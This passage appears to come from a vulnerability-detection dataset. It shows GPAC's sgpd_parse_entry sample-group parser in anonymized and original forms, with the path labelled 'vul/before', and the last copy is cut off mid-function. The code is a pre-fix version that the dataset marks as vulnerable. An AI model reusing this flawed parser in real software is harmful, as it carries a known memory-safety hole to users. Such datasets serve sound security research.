}","static void *sgpd_parse_entry(u32 VAR_0, GF_BitStream *VAR_1, s32 VAR_2, u32 VAR_3, u32 *VAR_4)
{
Bool VAR_5 = VAR_6;
GF_DefaultSampleGroupDescriptionEntry *VAR_7;
switch (VAR_0) {
case VAR_8:
case VAR_9:
{
GF_RollRecoveryEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_RollRecoveryEntry);
if (!VAR_10) return NULL;
VAR_10->roll_distance = gf_bs_read_int(VAR_1, 16);
*VAR_4 = 2;
return VAR_10;
}
case VAR_11:
{
GF_VisualRandomAccessEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_VisualRandomAccessEntry);
if (!VAR_10) return NULL;
VAR_10->num_leading_samples_known = gf_bs_read_int(VAR_1, 1);
VAR_10->num_leading_samples = gf_bs_read_int(VAR_1, 7);
*VAR_4 = 1;
return VAR_10;
}
case VAR_12:
{
GF_SAPEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_SAPEntry);
if (!VAR_10) return NULL;
VAR_10->dependent_flag = gf_bs_read_int(VAR_1, 1);
gf_bs_read_int(VAR_1, 3);
VAR_10->SAP_type = gf_bs_read_int(VAR_1, 4);
*VAR_4 = 1;
return VAR_10;
}
case VAR_13:
{
GF_SYNCEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_SYNCEntry);
if (!VAR_10) return NULL;
gf_bs_read_int(VAR_1, 2);
VAR_10->NALU_type = gf_bs_read_int(VAR_1, 6);
*VAR_4 = 1;
return VAR_10;
}
case VAR_14:
{
GF_TemporalLevelEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_TemporalLevelEntry);
if (!VAR_10) return NULL;
VAR_10->level_independently_decodable = gf_bs_read_int(VAR_1, 1);
gf_bs_read_int(VAR_1, 7);
*VAR_4 = 1;
return VAR_10;
}
case VAR_15:
{
GF_CENCSampleEncryptionGroupEntry *VAR_10;
if (VAR_2<3) return NULL;
GF_SAFEALLOC(VAR_10, GF_CENCSampleEncryptionGroupEntry);
if (!VAR_10) return NULL;
Bool VAR_16 = gf_bs_read_int(VAR_1, 1);
gf_bs_read_int(VAR_1, 7); 
VAR_10->crypt_byte_block = gf_bs_read_int(VAR_1, 4);
VAR_10->skip_byte_block = gf_bs_read_int(VAR_1, 4);
VAR_10->IsProtected = gf_bs_read_u8(VAR_1);
VAR_2 -= 3;
if (VAR_16) {
u64 VAR_17 = gf_bs_get_position(VAR_1);
u32 VAR_18, VAR_19 = gf_bs_read_u16(VAR_1);
VAR_2 -= 2;
if (VAR_2<0) {
gf_free(VAR_10);
return NULL;
}
for (VAR_18=0; VAR_18<VAR_19; VAR_18++) {
u8 VAR_20 = gf_bs_read_u8(VAR_1);
gf_bs_skip_bytes(VAR_1, 16);
VAR_2 -= 17;
if (!VAR_20) {
VAR_20 = gf_bs_read_u8(VAR_1);
gf_bs_skip_bytes(VAR_1, VAR_20);
VAR_2 -= 1 + VAR_20;
}
if (VAR_2<0) {
gf_free(VAR_10);
return NULL;
}
}
VAR_10->key_info_size = 1 + (u32) (gf_bs_get_position(VAR_1) - VAR_17);
VAR_10->key_info = gf_malloc(sizeof(u8) * VAR_10->key_info_size);
if (!VAR_10->key_info) {
gf_free(VAR_10);
return NULL;
}
gf_bs_seek(VAR_1, VAR_17);
VAR_10->key_info[0] = 1;
gf_bs_read_data(VAR_1, VAR_10->key_info + 1, VAR_10->key_info_size - 1);
*VAR_4 = 3 + VAR_10->key_info_size - 1;
if (!gf_cenc_validate_key_info(VAR_10->key_info, VAR_10->key_info_size)) {
gf_free(VAR_10->key_info);
gf_free(VAR_10);
return NULL;
}
} else {
bin128 VAR_21;
u8 VAR_22 = 0;
u8 VAR_23 = gf_bs_read_u8(VAR_1);
gf_bs_read_data(VAR_1, VAR_21, 16);
VAR_2 -= 17;
if (VAR_2<0) {
gf_free(VAR_10);
return NULL;
}
*VAR_4 = 20;
if ((VAR_10->IsProtected == 1) && !VAR_23) {
VAR_22 = gf_bs_read_u8(VAR_1);
if ((VAR_22 != 8) && (VAR_22 != 16)) {
GF_LOG(VAR_24, VAR_25, (""[iso file] seig sample group have invalid constant_IV size\n""));
gf_free(VAR_10);
return NULL;
}
}
VAR_10->key_info_size = 20;
if (!VAR_23 && VAR_10->IsProtected) {
VAR_10->key_info_size += 1 + VAR_22;
}
VAR_10->key_info = gf_malloc(sizeof(u8) * VAR_10->key_info_size);
if (!VAR_10->key_info) {
gf_free(VAR_10);
return NULL;
}
VAR_10->key_info[0] = 0;
VAR_10->key_info[1] = 0;
VAR_10->key_info[2] = 0;
VAR_10->key_info[3] = VAR_23;
memcpy(VAR_10->key_info+4, VAR_21, 16);
if (!VAR_23 && VAR_10->IsProtected) {
VAR_10->key_info[20] = VAR_22;
gf_bs_read_data(VAR_1, (char *)VAR_10->key_info+21, VAR_22);
*VAR_4 += 1 + VAR_22;
}
}
if (!VAR_3) {
GF_LOG(VAR_24, VAR_25, (""[iso file] seig sample group does not indicate entry size, deprecated in spec\n""));
}
return VAR_10;
}
case VAR_26:
{
GF_OperatingPointsInformation *VAR_10 = gf_isom_oinf_new_entry();
u32 VAR_27 = (u32) gf_bs_get_position(VAR_1);
gf_isom_oinf_read_entry(VAR_10, VAR_1);
*VAR_4 = (u32) gf_bs_get_position(VAR_1) - VAR_27;
if (!VAR_3) {
GF_LOG(VAR_24, VAR_25, (""[iso file] oinf sample group does not indicate entry size, deprecated in spec\n""));
}
return VAR_10;
}
case VAR_28:
{
GF_LHVCLayerInformation *VAR_10 = gf_isom_linf_new_entry();
u32 VAR_27 = (u32) gf_bs_get_position(VAR_1);
gf_isom_linf_read_entry(VAR_10, VAR_1);
*VAR_4 = (u32) gf_bs_get_position(VAR_1) - VAR_27;
if (!VAR_3) {
GF_LOG(VAR_24, VAR_25, (""[iso file] linf sample group does not indicate entry size, deprecated in spec\n""));
}
return VAR_10;
}
case VAR_29:
if (! VAR_3) {
u32 VAR_30 = gf_bs_peek_bits(VAR_1, 24, 0);
if (VAR_30 & 0x10000) VAR_3=3;
else {
if (VAR_30 & 0x80000) VAR_3=7;
else VAR_3=11;
if (VAR_30 & 0x200000) {
u32 VAR_31 = gf_bs_peek_bits(VAR_1, 16, VAR_3);
VAR_3 += 2 + 2*VAR_31;
}
}
GF_LOG(VAR_24, VAR_25, (""[iso file] trif sample group does not indicate entry size, deprecated in spec\n""));
}
break;
case VAR_32:
if (! VAR_3) {
u64 VAR_33 = gf_bs_get_position(VAR_1);
Bool VAR_34, VAR_35;
u32 VAR_36;
gf_bs_read_int(VAR_1, 6);
VAR_35 = gf_bs_read_int(VAR_1, 1);
VAR_34 = gf_bs_read_int(VAR_1, 1);
VAR_36 = gf_bs_read_int(VAR_1, VAR_35 ? 16 : 8);
gf_bs_seek(VAR_1, VAR_33);
VAR_3 = 1 + (VAR_35 ? 2 : 1);
VAR_3 += VAR_36 * 2;
if (VAR_34) VAR_3 += VAR_36 * (VAR_35 ? 2 : 1);
GF_LOG(VAR_24, VAR_25, (""[iso file] nalm sample group does not indicate entry size, deprecated in spec\n""));
}
break;
case VAR_37:
case VAR_38:
VAR_5 = VAR_39;
break;
case VAR_40:
VAR_3 = 20;
break;
case VAR_41:
VAR_3 = 2;
break;
case VAR_42:
{
u32 VAR_18;
GF_SubpictureOrderEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_SubpictureOrderEntry);
if (!VAR_10) return NULL;
VAR_10->subpic_id_info_flag = gf_bs_read_int(VAR_1, 1);
VAR_10->num_subpic_ref_idx = gf_bs_read_int(VAR_1, 15);
*VAR_4 = 2;
VAR_10->subp_track_ref_idx = gf_malloc(sizeof(VAR_43) * VAR_10->num_subpic_ref_idx);
if (!VAR_10->subp_track_ref_idx) {
gf_free(VAR_10);
return NULL;
}
for (VAR_18=0; VAR_18<VAR_10->num_subpic_ref_idx; VAR_18++) {
VAR_10->subp_track_ref_idx[VAR_18] = gf_bs_read_u16(VAR_1);
*VAR_4 += 2;
}
if (VAR_10->subpic_id_info_flag) {
VAR_10->spinfo.subpic_id_len_minus1 = gf_bs_read_int(VAR_1, 4);
VAR_10->spinfo.subpic_id_bit_pos = gf_bs_read_int(VAR_1, 12);
VAR_10->spinfo.start_code_emul_flag = gf_bs_read_int(VAR_1, 1);
VAR_10->spinfo.pps_sps_subpic_id_flag = gf_bs_read_int(VAR_1, 1);
if (VAR_10->spinfo.pps_sps_subpic_id_flag) {
VAR_10->spinfo.xps_id = gf_bs_read_int(VAR_1, 6);
} else {
VAR_10->spinfo.xps_id = gf_bs_read_int(VAR_1, 4);
gf_bs_read_int(VAR_1, 2);
}
*VAR_4 += 3;
}
return VAR_10;
}
case VAR_44:
{
u32 VAR_18;
GF_SubpictureLayoutMapEntry *VAR_10;
GF_SAFEALLOC(VAR_10, GF_SubpictureLayoutMapEntry);
if (!VAR_10) return NULL;
VAR_10->groupID_info_4cc = gf_bs_read_u32(VAR_1);
VAR_10->nb_entries = 1 + gf_bs_read_u16(VAR_1);
*VAR_4 = 6;
VAR_10->groupIDs = gf_malloc(sizeof(VAR_43) * VAR_10->nb_entries);
if (!VAR_10->groupIDs) {
gf_free(VAR_10);
return NULL;
}
for (VAR_18=0; VAR_18<VAR_10->nb_entries; VAR_18++) {
VAR_10->groupIDs[VAR_18] = gf_bs_read_u16(VAR_1);
*VAR_4 += 2;
}
return VAR_10;
}
default:
break;
}
if (!VAR_3 && !VAR_5) {
GF_LOG(VAR_24, VAR_25, (""[iso file] %s sample group does not indicate entry size and is not implemented, cannot parse!\n"", gf_4cc_to_str( VAR_0) ));
return NULL;
}
GF_SAFEALLOC(VAR_7, GF_DefaultSampleGroupDescriptionEntry);
if (!VAR_7) return NULL;
if (VAR_3) {
VAR_7->length = VAR_3;
VAR_7->data = (u8 *) gf_malloc(sizeof(u8)*VAR_7->length);
if (!VAR_7->data) {
gf_free(VAR_7);
return NULL;
}
gf_bs_read_data(VAR_1, (char *) VAR_7->data, VAR_7->length);
*VAR_4 = VAR_3;
}
return VAR_7;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/before/2.json,"static void *sgpd_parse_entry(u32 grouping_type, GF_BitStream *bs, s32 bytes_in_box, u32 entry_size, u32 *total_bytes)
{
	Bool null_size_ok = GF_FALSE;
	GF_DefaultSampleGroupDescriptionEntry *def_ptr;

	switch (grouping_type) {
	case GF_ISOM_SAMPLE_GROUP_ROLL:
	case GF_ISOM_SAMPLE_GROUP_PROL:
	{
		GF_RollRecoveryEntry *ptr;
		GF_SAFEALLOC(ptr, GF_RollRecoveryEntry);
		if (!ptr) return NULL;
		ptr->roll_distance = gf_bs_read_int(bs, 16);
		*total_bytes = 2;
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_RAP:
	{
		GF_VisualRandomAccessEntry *ptr;
		GF_SAFEALLOC(ptr, GF_VisualRandomAccessEntry);
		if (!ptr) return NULL;
		ptr->num_leading_samples_known = gf_bs_read_int(bs, 1);
		ptr->num_leading_samples = gf_bs_read_int(bs, 7);
		*total_bytes = 1;
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_SAP:
	{
		GF_SAPEntry *ptr;
		GF_SAFEALLOC(ptr, GF_SAPEntry);
		if (!ptr) return NULL;
		ptr->dependent_flag = gf_bs_read_int(bs, 1);
		gf_bs_read_int(bs, 3);
		ptr->SAP_type = gf_bs_read_int(bs, 4);
		*total_bytes = 1;
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_SYNC:
	{
		GF_SYNCEntry *ptr;
		GF_SAFEALLOC(ptr, GF_SYNCEntry);
		if (!ptr) return NULL;
		gf_bs_read_int(bs, 2);
		ptr->NALU_type = gf_bs_read_int(bs, 6);
		*total_bytes = 1;
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_TELE:
	{
		GF_TemporalLevelEntry *ptr;
		GF_SAFEALLOC(ptr, GF_TemporalLevelEntry);
		if (!ptr) return NULL;
		ptr->level_independently_decodable = gf_bs_read_int(bs, 1);
		gf_bs_read_int(bs, 7);
		*total_bytes = 1;
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_SEIG:
	{
		GF_CENCSampleEncryptionGroupEntry *ptr;
		if (bytes_in_box<3) return NULL;
		GF_SAFEALLOC(ptr, GF_CENCSampleEncryptionGroupEntry);
		if (!ptr) return NULL;
		Bool use_mkey = gf_bs_read_int(bs, 1);
		gf_bs_read_int(bs, 7); //reserved
		ptr->crypt_byte_block = gf_bs_read_int(bs, 4);
		ptr->skip_byte_block = gf_bs_read_int(bs, 4);
		ptr->IsProtected = gf_bs_read_u8(bs);
		bytes_in_box -= 3;
		if (use_mkey) {
			u64 pos = gf_bs_get_position(bs);
			u32 i, count = gf_bs_read_u16(bs);
			bytes_in_box -= 2;
			if (bytes_in_box<0) {
				gf_free(ptr);
				return NULL;
			}
			for (i=0; i<count; i++) {
				u8 ivsize = gf_bs_read_u8(bs);
				gf_bs_skip_bytes(bs, 16);
				bytes_in_box -= 17;
				if (!ivsize) {
					//const IV
					ivsize = gf_bs_read_u8(bs);
					gf_bs_skip_bytes(bs, ivsize);
					bytes_in_box -= 1 + ivsize;
				}
				if (bytes_in_box<0) {
					gf_free(ptr);
					return NULL;
				}
			}
			ptr->key_info_size = 1 + (u32) (gf_bs_get_position(bs) - pos);
			ptr->key_info = gf_malloc(sizeof(u8) * ptr->key_info_size);
			if (!ptr->key_info) {
				gf_free(ptr);
				return NULL;
			}
			gf_bs_seek(bs, pos);
			ptr->key_info[0] = 1;
			gf_bs_read_data(bs, ptr->key_info + 1, ptr->key_info_size - 1);
			*total_bytes = 3 + ptr->key_info_size - 1;

			if (!gf_cenc_validate_key_info(ptr->key_info, ptr->key_info_size)) {
				gf_free(ptr->key_info);
				gf_free(ptr);
				return NULL;
			}
		} else {
			bin128 kid;
			u8 const_iv_size = 0;
			u8 iv_size = gf_bs_read_u8(bs);
			gf_bs_read_data(bs, kid, 16);
			bytes_in_box -= 17;
			if (bytes_in_box<0) {
				gf_free(ptr);
				return NULL;
			}

			*total_bytes = 20;
			if ((ptr->IsProtected == 1) && !iv_size) {
				const_iv_size = gf_bs_read_u8(bs);
				if ((const_iv_size != 8) && (const_iv_size != 16)) {
					GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] seig sample group have invalid constant_IV size\n""));
					gf_free(ptr);
					return NULL;
				}
			}
			ptr->key_info_size = 20;
			if (!iv_size && ptr->IsProtected) {
				ptr->key_info_size += 1 + const_iv_size;
			}
			ptr->key_info = gf_malloc(sizeof(u8) * ptr->key_info_size);
			if (!ptr->key_info) {
				gf_free(ptr);
				return NULL;
			}
			ptr->key_info[0] = 0;
			ptr->key_info[1] = 0;
			ptr->key_info[2] = 0;
			ptr->key_info[3] = iv_size;
			memcpy(ptr->key_info+4, kid, 16);
			if (!iv_size && ptr->IsProtected) {
				ptr->key_info[20] = const_iv_size;
				gf_bs_read_data(bs, (char *)ptr->key_info+21, const_iv_size);
				*total_bytes += 1 + const_iv_size;
			}
		}

		if (!entry_size) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] seig sample group does not indicate entry size, deprecated in spec\n""));
		}
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_OINF:
	{
		GF_OperatingPointsInformation *ptr = gf_isom_oinf_new_entry();
		u32 s = (u32) gf_bs_get_position(bs);
		gf_isom_oinf_read_entry(ptr, bs);
		*total_bytes = (u32) gf_bs_get_position(bs) - s;
		if (!entry_size) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] oinf sample group does not indicate entry size, deprecated in spec\n""));
		}
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_LINF:
	{
		GF_LHVCLayerInformation *ptr = gf_isom_linf_new_entry();
		u32 s = (u32) gf_bs_get_position(bs);
		gf_isom_linf_read_entry(ptr, bs);
		*total_bytes = (u32) gf_bs_get_position(bs) - s;
		if (!entry_size) {
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] linf sample group does not indicate entry size, deprecated in spec\n""));
		}
		return ptr;
	}

	case GF_ISOM_SAMPLE_GROUP_TRIF:
		if (! entry_size) {
			u32 flags = gf_bs_peek_bits(bs, 24, 0);
			if (flags & 0x10000) entry_size=3;
			else {
				if (flags & 0x80000) entry_size=7;
				else entry_size=11;
				//have dependency list
				if (flags & 0x200000) {
					u32 nb_entries = gf_bs_peek_bits(bs, 16, entry_size);
					entry_size += 2 + 2*nb_entries;
				}
			}
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] trif sample group does not indicate entry size, deprecated in spec\n""));
		}
		break;
	case GF_ISOM_SAMPLE_GROUP_NALM:
		if (! entry_size) {
			u64 start = gf_bs_get_position(bs);
			Bool rle, large_size;
			u32 entry_count;
			gf_bs_read_int(bs, 6);
			large_size = gf_bs_read_int(bs, 1);
			rle = gf_bs_read_int(bs, 1);
			entry_count = gf_bs_read_int(bs, large_size ? 16 : 8);
			gf_bs_seek(bs, start);
			entry_size = 1 + (large_size ? 2 : 1);
			entry_size += entry_count * 2;
			if (rle) entry_size += entry_count * (large_size ? 2 : 1);
			GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] nalm sample group does not indicate entry size, deprecated in spec\n""));
		}
		break;

	case GF_ISOM_SAMPLE_GROUP_TSAS:
	case GF_ISOM_SAMPLE_GROUP_STSA:
		null_size_ok = GF_TRUE;
		break;
	//TODO, add support for these ones ?
	case GF_ISOM_SAMPLE_GROUP_TSCL:
		entry_size = 20;
		break;
	case GF_ISOM_SAMPLE_GROUP_LBLI:
		entry_size = 2;
		break;
	case GF_ISOM_SAMPLE_GROUP_SPOR:
	{
		u32 i;
		GF_SubpictureOrderEntry *ptr;
		GF_SAFEALLOC(ptr, GF_SubpictureOrderEntry);
		if (!ptr) return NULL;
		ptr->subpic_id_info_flag = gf_bs_read_int(bs, 1);
		ptr->num_subpic_ref_idx = gf_bs_read_int(bs, 15);
		*total_bytes = 2;
		ptr->subp_track_ref_idx = gf_malloc(sizeof(u16) * ptr->num_subpic_ref_idx);
		if (!ptr->subp_track_ref_idx) {
			gf_free(ptr);
			return NULL;
		}
		for (i=0; i<ptr->num_subpic_ref_idx; i++) {
			ptr->subp_track_ref_idx[i] = gf_bs_read_u16(bs);
			*total_bytes += 2;
		}
		if (ptr->subpic_id_info_flag) {
			ptr->spinfo.subpic_id_len_minus1 = gf_bs_read_int(bs, 4);
			ptr->spinfo.subpic_id_bit_pos = gf_bs_read_int(bs, 12);
			ptr->spinfo.start_code_emul_flag = gf_bs_read_int(bs, 1);
			ptr->spinfo.pps_sps_subpic_id_flag = gf_bs_read_int(bs, 1);
			if (ptr->spinfo.pps_sps_subpic_id_flag) {
				ptr->spinfo.xps_id = gf_bs_read_int(bs, 6);
			} else {
				ptr->spinfo.xps_id = gf_bs_read_int(bs, 4);
				gf_bs_read_int(bs, 2);
			}
			*total_bytes += 3;
		}
		return ptr;
	}
	case GF_ISOM_SAMPLE_GROUP_SULM:
	{
		u32 i;
		GF_SubpictureLayoutMapEntry *ptr;
		GF_SAFEALLOC(ptr, GF_SubpictureLayoutMapEntry);
		if (!ptr) return NULL;
		ptr->groupID_info_4cc = gf_bs_read_u32(bs);
		ptr->nb_entries = 1 + gf_bs_read_u16(bs);
		*total_bytes = 6;
		ptr->groupIDs = gf_malloc(sizeof(u16) * ptr->nb_entries);
		if (!ptr->groupIDs) {
			gf_free(ptr);
			return NULL;
		}
		for (i=0; i<ptr->nb_entries; i++) {
			ptr->groupIDs[i] = gf_bs_read_u16(bs);
			*total_bytes += 2;
		}
		return ptr;
	}
	case 0:
		GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] sgpd entry null grouping_type is invalid\n"") );
		return NULL;
	default:
		break;
	}

	if (!entry_size && !null_size_ok) {
		GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] %s sample group does not indicate entry size and is not implemented, cannot parse!\n"", gf_4cc_to_str( grouping_type) ));
		return NULL;
	}
	GF_SAFEALLOC(def_ptr, GF_DefaultSampleGroupDescriptionEntry);
	if (!def_ptr) return NULL;
	if (entry_size) {
		def_ptr->length = entry_size;
		def_ptr->data = (u8 *) gf_malloc(sizeof(u8)*def_ptr->length);
		if (!def_ptr->data) {
			gf_free(def_ptr);
			return NULL;
		}
		gf_bs_read_data(bs, (char *) def_ptr->data, def_ptr->length);
		*total_bytes = entry_size;
	}
	return def_ptr;
}","static void *sgpd_parse_entry(u32 VAR_0, GF_BitStream *VAR_1, s32 VAR_2, u32 VAR_3, u32 *VAR_4)
{
	Bool VAR_5 = VAR_6;
	GF_DefaultSampleGroupDescriptionEntry *VAR_7;

	switch (VAR_0) {
	case VAR_8:
	case VAR_9:
	{
		GF_RollRecoveryEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_RollRecoveryEntry);
		if (!VAR_10) return NULL;
		VAR_10->roll_distance = gf_bs_read_int(VAR_1, 16);
		*VAR_4 = 2;
		return VAR_10;
	}
	case VAR_11:
	{
		GF_VisualRandomAccessEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_VisualRandomAccessEntry);
		if (!VAR_10) return NULL;
		VAR_10->num_leading_samples_known = gf_bs_read_int(VAR_1, 1);
		VAR_10->num_leading_samples = gf_bs_read_int(VAR_1, 7);
		*VAR_4 = 1;
		return VAR_10;
	}
	case VAR_12:
	{
		GF_SAPEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_SAPEntry);
		if (!VAR_10) return NULL;
		VAR_10->dependent_flag = gf_bs_read_int(VAR_1, 1);
		gf_bs_read_int(VAR_1, 3);
		VAR_10->SAP_type = gf_bs_read_int(VAR_1, 4);
		*VAR_4 = 1;
		return VAR_10;
	}
	case VAR_13:
	{
		GF_SYNCEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_SYNCEntry);
		if (!VAR_10) return NULL;
		gf_bs_read_int(VAR_1, 2);
		VAR_10->NALU_type = gf_bs_read_int(VAR_1, 6);
		*VAR_4 = 1;
		return VAR_10;
	}
	case VAR_14:
	{
		GF_TemporalLevelEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_TemporalLevelEntry);
		if (!VAR_10) return NULL;
		VAR_10->level_independently_decodable = gf_bs_read_int(VAR_1, 1);
		gf_bs_read_int(VAR_1, 7);
		*VAR_4 = 1;
		return VAR_10;
	}
	case VAR_15:
	{
		GF_CENCSampleEncryptionGroupEntry *VAR_10;
		if (VAR_2<3) return NULL;
		GF_SAFEALLOC(VAR_10, GF_CENCSampleEncryptionGroupEntry);
		if (!VAR_10) return NULL;
		Bool VAR_16 = gf_bs_read_int(VAR_1, 1);
		gf_bs_read_int(VAR_1, 7); /* COMMENT_0 */
		VAR_10->crypt_byte_block = gf_bs_read_int(VAR_1, 4);
		VAR_10->skip_byte_block = gf_bs_read_int(VAR_1, 4);
		VAR_10->IsProtected = gf_bs_read_u8(VAR_1);
		VAR_2 -= 3;
		if (VAR_16) {
			u64 VAR_17 = gf_bs_get_position(VAR_1);
			u32 VAR_18, VAR_19 = gf_bs_read_u16(VAR_1);
			VAR_2 -= 2;
			if (VAR_2<0) {
				gf_free(VAR_10);
				return NULL;
			}
			for (VAR_18=0; VAR_18<VAR_19; VAR_18++) {
				u8 VAR_20 = gf_bs_read_u8(VAR_1);
				gf_bs_skip_bytes(VAR_1, 16);
				VAR_2 -= 17;
				if (!VAR_20) {
					/* COMMENT_1 */
					VAR_20 = gf_bs_read_u8(VAR_1);
					gf_bs_skip_bytes(VAR_1, VAR_20);
					VAR_2 -= 1 + VAR_20;
				}
				if (VAR_2<0) {
					gf_free(VAR_10);
					return NULL;
				}
			}
			VAR_10->key_info_size = 1 + (u32) (gf_bs_get_position(VAR_1) - VAR_17);
			VAR_10->key_info = gf_malloc(sizeof(u8) * VAR_10->key_info_size);
			if (!VAR_10->key_info) {
				gf_free(VAR_10);
				return NULL;
			}
			gf_bs_seek(VAR_1, VAR_17);
			VAR_10->key_info[0] = 1;
			gf_bs_read_data(VAR_1, VAR_10->key_info + 1, VAR_10->key_info_size - 1);
			*VAR_4 = 3 + VAR_10->key_info_size - 1;

			if (!gf_cenc_validate_key_info(VAR_10->key_info, VAR_10->key_info_size)) {
				gf_free(VAR_10->key_info);
				gf_free(VAR_10);
				return NULL;
			}
		} else {
			bin128 VAR_21;
			u8 VAR_22 = 0;
			u8 VAR_23 = gf_bs_read_u8(VAR_1);
			gf_bs_read_data(VAR_1, VAR_21, 16);
			VAR_2 -= 17;
			if (VAR_2<0) {
				gf_free(VAR_10);
				return NULL;
			}

			*VAR_4 = 20;
			if ((VAR_10->IsProtected == 1) && !VAR_23) {
				VAR_22 = gf_bs_read_u8(VAR_1);
				if ((VAR_22 != 8) && (VAR_22 != 16)) {
					GF_LOG(VAR_24, VAR_25, (""[iso file] seig sample group have invalid constant_IV size\n""));
					gf_free(VAR_10);
					return NULL;
				}
			}
			VAR_10->key_info_size = 20;
			if (!VAR_23 && VAR_10->IsProtected) {
				VAR_10->key_info_size += 1 + VAR_22;
			}
			VAR_10->key_info = gf_malloc(sizeof(u8) * VAR_10->key_info_size);
			if (!VAR_10->key_info) {
				gf_free(VAR_10);
				return NULL;
			}
			VAR_10->key_info[0] = 0;
			VAR_10->key_info[1] = 0;
			VAR_10->key_info[2] = 0;
			VAR_10->key_info[3] = VAR_23;
			memcpy(VAR_10->key_info+4, VAR_21, 16);
			if (!VAR_23 && VAR_10->IsProtected) {
				VAR_10->key_info[20] = VAR_22;
				gf_bs_read_data(VAR_1, (char *)VAR_10->key_info+21, VAR_22);
				*VAR_4 += 1 + VAR_22;
			}
		}

		if (!VAR_3) {
			GF_LOG(VAR_24, VAR_25, (""[iso file] seig sample group does not indicate entry size, deprecated in spec\n""));
		}
		return VAR_10;
	}
	case VAR_26:
	{
		GF_OperatingPointsInformation *VAR_10 = gf_isom_oinf_new_entry();
		u32 VAR_27 = (u32) gf_bs_get_position(VAR_1);
		gf_isom_oinf_read_entry(VAR_10, VAR_1);
		*VAR_4 = (u32) gf_bs_get_position(VAR_1) - VAR_27;
		if (!VAR_3) {
			GF_LOG(VAR_24, VAR_25, (""[iso file] oinf sample group does not indicate entry size, deprecated in spec\n""));
		}
		return VAR_10;
	}
	case VAR_28:
	{
		GF_LHVCLayerInformation *VAR_10 = gf_isom_linf_new_entry();
		u32 VAR_27 = (u32) gf_bs_get_position(VAR_1);
		gf_isom_linf_read_entry(VAR_10, VAR_1);
		*VAR_4 = (u32) gf_bs_get_position(VAR_1) - VAR_27;
		if (!VAR_3) {
			GF_LOG(VAR_24, VAR_25, (""[iso file] linf sample group does not indicate entry size, deprecated in spec\n""));
		}
		return VAR_10;
	}

	case VAR_29:
		if (! VAR_3) {
			u32 VAR_30 = gf_bs_peek_bits(VAR_1, 24, 0);
			if (VAR_30 & 0x10000) VAR_3=3;
			else {
				if (VAR_30 & 0x80000) VAR_3=7;
				else VAR_3=11;
				/* COMMENT_2 */
				if (VAR_30 & 0x200000) {
					u32 VAR_31 = gf_bs_peek_bits(VAR_1, 16, VAR_3);
					VAR_3 += 2 + 2*VAR_31;
				}
			}
			GF_LOG(VAR_24, VAR_25, (""[iso file] trif sample group does not indicate entry size, deprecated in spec\n""));
		}
		break;
	case VAR_32:
		if (! VAR_3) {
			u64 VAR_33 = gf_bs_get_position(VAR_1);
			Bool VAR_34, VAR_35;
			u32 VAR_36;
			gf_bs_read_int(VAR_1, 6);
			VAR_35 = gf_bs_read_int(VAR_1, 1);
			VAR_34 = gf_bs_read_int(VAR_1, 1);
			VAR_36 = gf_bs_read_int(VAR_1, VAR_35 ? 16 : 8);
			gf_bs_seek(VAR_1, VAR_33);
			VAR_3 = 1 + (VAR_35 ? 2 : 1);
			VAR_3 += VAR_36 * 2;
			if (VAR_34) VAR_3 += VAR_36 * (VAR_35 ? 2 : 1);
			GF_LOG(VAR_24, VAR_25, (""[iso file] nalm sample group does not indicate entry size, deprecated in spec\n""));
		}
		break;

	case VAR_37:
	case VAR_38:
		VAR_5 = VAR_39;
		break;
	/* COMMENT_3 */
	case VAR_40:
		VAR_3 = 20;
		break;
	case VAR_41:
		VAR_3 = 2;
		break;
	case VAR_42:
	{
		u32 VAR_18;
		GF_SubpictureOrderEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_SubpictureOrderEntry);
		if (!VAR_10) return NULL;
		VAR_10->subpic_id_info_flag = gf_bs_read_int(VAR_1, 1);
		VAR_10->num_subpic_ref_idx = gf_bs_read_int(VAR_1, 15);
		*VAR_4 = 2;
		VAR_10->subp_track_ref_idx = gf_malloc(sizeof(VAR_43) * VAR_10->num_subpic_ref_idx);
		if (!VAR_10->subp_track_ref_idx) {
			gf_free(VAR_10);
			return NULL;
		}
		for (VAR_18=0; VAR_18<VAR_10->num_subpic_ref_idx; VAR_18++) {
			VAR_10->subp_track_ref_idx[VAR_18] = gf_bs_read_u16(VAR_1);
			*VAR_4 += 2;
		}
		if (VAR_10->subpic_id_info_flag) {
			VAR_10->spinfo.subpic_id_len_minus1 = gf_bs_read_int(VAR_1, 4);
			VAR_10->spinfo.subpic_id_bit_pos = gf_bs_read_int(VAR_1, 12);
			VAR_10->spinfo.start_code_emul_flag = gf_bs_read_int(VAR_1, 1);
			VAR_10->spinfo.pps_sps_subpic_id_flag = gf_bs_read_int(VAR_1, 1);
			if (VAR_10->spinfo.pps_sps_subpic_id_flag) {
				VAR_10->spinfo.xps_id = gf_bs_read_int(VAR_1, 6);
			} else {
				VAR_10->spinfo.xps_id = gf_bs_read_int(VAR_1, 4);
